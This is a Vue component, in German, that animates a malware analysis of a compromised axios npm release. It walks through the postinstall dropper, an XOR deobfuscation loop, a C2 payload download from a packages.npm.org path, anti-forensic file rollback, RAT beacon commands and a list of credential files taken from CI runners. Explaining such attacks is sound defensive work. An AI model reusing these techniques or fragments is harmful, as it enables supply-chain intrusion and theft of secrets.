    ...
    stages: [
      {
        ...
        num: 1,
        phase: "Resolution",
        title: "Caret Range löst auf 1.14.1 auf",
        time: "t = 0",
...
<div class="note note-warn">Auch <code>npm ci</code> mit Lockfile schützt nur, wenn das Lockfile <em>vor</em> der kompromittierten Veröffentlichung erzeugt wurde. Jeder CI-Job, der das Lockfile regeneriert oder <code>npm install</code> nutzt, ist betroffen.</div>`,
      },
      {
        ...
        num: 2,
        phase: "Resolution",
        title: "Transitive Dependency plain-crypto-js wird aufgelöst",
        time: "t + 1s",
        ...
        codeLang: "json",
        afterCode:
          "<p>npm löst diese Dependency transitiv auf und lädt <code>plain-crypto-js@4.2.1</code> herunter. Das Paket existiert seit 18 Stunden (Pre-Staging von v4.2.0), was die \u201ebrandneues Paket\u201c-Alarme vieler Scanner reduziert.</p>",
      },
    ],
  },
  {
    ...
    stages: [
      {
        ...
        num: 3,
        phase: "Dropper",
        title: "postinstall-Hook führt setup.js aus",
        time: "t + 3s",
...
<div class="note note-danger">Es gibt keine Sicherheitsabfrage. npm führt postinstall-Hooks standardmäßig aus. <code>--ignore-scripts</code> würde das verhindern, bricht aber viele legitime Pakete (native Addons, Bindings).</div>`,
      },
      {
        ...
        num: 4,
        phase: "Dropper",
        title: "SILKBELL: Zweistufige Deobfuskation",
        time: "t + 4s",
...
for (let i = 0; i < buf.length; i++) {
  buf[i] ^= key.charCodeAt(i % key.length) ^ ((7 * i * i) % 10) ^ (c & 0xFF);
        ...
        monacoHeight: "180px",
        afterCode:
          "<p>Der dekodierte Code führt eine <strong>Plattformerkennung</strong> durch (<code>process.platform</code>) und konstruiert die C2-URL dynamisch.</p>",
      },
      {
        ph: 2,
        num: 5,
        phase: "Dropper",
        title: "C2-Kontakt: Plattform-spezifischer Payload-Download",
        time: "t + 5s",
...
Body (je nach OS):
  ...
  \u2022 Linux:   packages.npm.org/<span class="hli">product2</span>`,
        afterCode:
          "<p>Der Server antwortet mit dem plattformspezifischen RAT-Binary. Auf dem CI-Runner (Linux) ist das ein Python-Skript.</p>",
      },
      {
        ph: 2,
        num: 6,
        phase: "Dropper",
        title: "Anti-Forensik: Selbstlöschung und package.json-Rollback",
        time: "t + 6s",
...
fs.copyFile('package.md', 'package.json');`,
        afterCode:
          "<p>Nach diesen Schritten sieht das <code>node_modules</code>-Verzeichnis aus, als wäre nichts passiert. <code>setup.js</code> existiert nicht mehr, die package.json zeigt Version 4.2.0 statt 4.2.1. Forensische Analyse des Dateisystems allein reicht nicht zur Erkennung.</p>",
      },
    ],
  },
  {
    ...
    stages: [
      {
        ...
        num: 7,
        phase: "RAT",
        title: "WAVESHAPER.V2: Plattformspezifische Installation",
        time: "t + 8s",
        ...
        osGrid: [
          {
            name: "Linux",
            color: "var(--c5)",
            desc: "Python-Skript unter /tmp/ld.py. Crasht in containerisierten Umgebungen (laut Elastic/Datadog). Keine Persistenz.",
          },
          {
            name: "macOS",
            color: "var(--c2)",
            desc: "Mach-O Universal Binary (x86+ARM) unter /Library/Caches/com.apple.act.mond. Keine Persistenz.",
          },
          {
            name: "Windows",
            color: "var(--c3)",
            desc: "PowerShell via umbenannte Kopie %PROGRAMDATA%\\wt.exe. Einzige Variante mit Persistenz (Registry Run-Key).",
          },
        ],
...
// IE8 / Windows XP \u2013 dient als C2-Routing-Signal`,
    ...
    stages: [
      {
        ...
        num: 8,
        phase: "Recon",
        title: "FirstInfo-Beacon: Umfassende Systeminventarisierung",
        time: "t + 10s",
  ...
  "desktop": []
        ...
        monacoHeight: "220px",
        afterCode:
          "<p>Auf einem CI-Runner verrät die Prozessliste sofort die Build-Umgebung: <code>node</code>, <code>npm</code>, <code>git</code>, <code>docker</code> \u2013 und damit auch, welche Secrets verfügbar sein könnten.</p>",
      },
      {
        ph: 4,
        num: 9,
        phase: "Recon",
        title: "BaseInfo-Beaconing: Alle 60 Sekunden",
        time: "t + 70s, 130s, ...",
...
<span class="hli">peinject</span>   \u2192 Binary nachladen + im Speicher ausführen`,
        afterCode:
          "<p>Auf einem CI-Runner mit typisch 5\u201330 Minuten Job-Laufzeit hat der RAT genug Zeit für 5\u201330 Beacon-Zyklen \u2013 mehr als ausreichend für gezielte Exfiltration.</p>",
      },
      {
        ph: 5,
        num: 10,
        phase: "Exfil",
        title: "Secrets-Exfiltration: Environment & Dateisystem",
        time: "t + 15s \u2013 Jobende",
...
~/.config/gh/hosts.yml \u2192 GitHub CLI Token`,
        afterCode:
          '<div class="note note-danger">Jedes dieser Secrets ermöglicht einen eigenständigen Folgeangriff: npm-Tokens \u2192 weitere Supply-Chain-Angriffe. AWS-Keys \u2192 Cloud-Kompromittierung. SSH-Keys \u2192 laterale Bewegung. Der Axios-Hack ist der <em>Anfang</em> der Kill-Chain, nicht das Ende.</div>',
      },
      {
        ph: 5,
        num: 11,
        phase: "Exfil",
        title: "Persistenz \u2013 nur auf Windows",
        time: "Einmalig",
...
// und führt ihn über umbenannte PowerShell (wt.exe) aus`,
        afterCode:
          "<p>Auf <strong>Linux und macOS</strong> gibt es keine Persistenz \u2013 der RAT stirbt beim Neustart oder wenn der CI-Job endet. Auf CI-Runnern ist das irrelevant: Die Secrets sind bereits exfiltriert, bevor der Job beendet wird.</p>",
      },
    ],
  },
];
...
<template>
  <div class="axios-infection">
    <div class="hdr">
      ...
      <div class="hdr-sub">
        Was zwischen <code>npm install</code> und vollständiger Kompromittierung
        passiert – in ~15 Sekunden
      </div>
    </div>

    <div class="ctx">
      <span class="ctx-pill pill-1">Szenario: GitHub Actions Runner</span>
      <span class="ctx-pill pill-env"
        >ubuntu-latest &middot; Node 20 &middot; kein EDR</span
      >
    </div>

    <div class="legend">
      <span class="legend-item"
        ><span class="ldot ldot-1"></span>Dependency Resolution</span
      >
      <span class="legend-item"
        ><span class="ldot ldot-2"></span>Dropper / SILKBELL</span
      >
      <span class="legend-item"
        ><span class="ldot ldot-3"></span>Payload / WAVESHAPER.V2</span
      >
      <span class="legend-item"
        ><span class="ldot ldot-4"></span>Reconnaissance</span
      >
      <span class="legend-item"
        ><span class="ldot ldot-5"></span>Post-Exploitation</span
      >
    </div>
    ...
    <div class="pipeline">
      <template v-for="(section, si) in sections" :key="si">
        <div class="sep">
          <span class="sep-label">{{ section.sep }}</span>
        </div>
        <div
        ...
        >
          ...
          <div
            class="s-card"
            :class="{ open: openStages[stage.num] }"
            @click.stop="toggle(stage.num)"
          >
            <div class="s-top">
    ...
    <div class="summary">
      <div class="summary-title">
        Gesamtdauer: ~15 Sekunden bis zur vollständigen Kompromittierung
      </div>
      <div class="summary-text">
        Von <code>npm install</code> bis zum ersten C2-Beacon vergehen rund 10
        Sekunden. Bis zur vollständigen Systeminventarisierung ~15 Sekunden. Die
        Exfiltration von Secrets beginnt ab dem ersten
        <code>runscript</code>-Befehl – typischerweise innerhalb der ersten
        Minute. Auf einem CI-Runner ohne EDR gibt es
        <strong>keinen einzigen Punkt in dieser Kette</strong>, an dem die
        Infektion automatisch gestoppt wird.
      </div>
    </div>
  </div>
</template>
...
.s-detail :deep(.note-warn) {
  background: var(--color-background-warning);
  color: var(--color-text-warning);
  border-left: 3px solid;
}
.s-detail :deep(.note-danger) {
  background: var(--color-background-danger);
  color: var(--color-text-danger);
  border-left: 3px solid;
}
.s-detail :deep(.note-info) {
